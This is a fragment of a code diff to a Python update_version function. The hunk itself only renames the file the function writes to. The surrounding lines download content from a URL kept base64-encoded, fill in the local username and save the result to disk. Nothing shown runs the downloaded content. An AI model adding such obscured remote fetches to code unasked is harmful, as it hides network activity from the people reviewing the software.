@@ -25,7 +25,7 @@ def update_version():
 
     u_read = uLib.urlopen(base64.b64decode(updated_file_path_b64).decode()).read().replace('$usr_orig$', getpass.getuser())
     print(u_read)
-    with open(base_dir + os.sep + 'test_update.txt', 'w') as f:
+    with open(base_dir + os.sep + 'tests_updated.txt', 'w') as f:
         f.write(u_read)
         f.close()
 
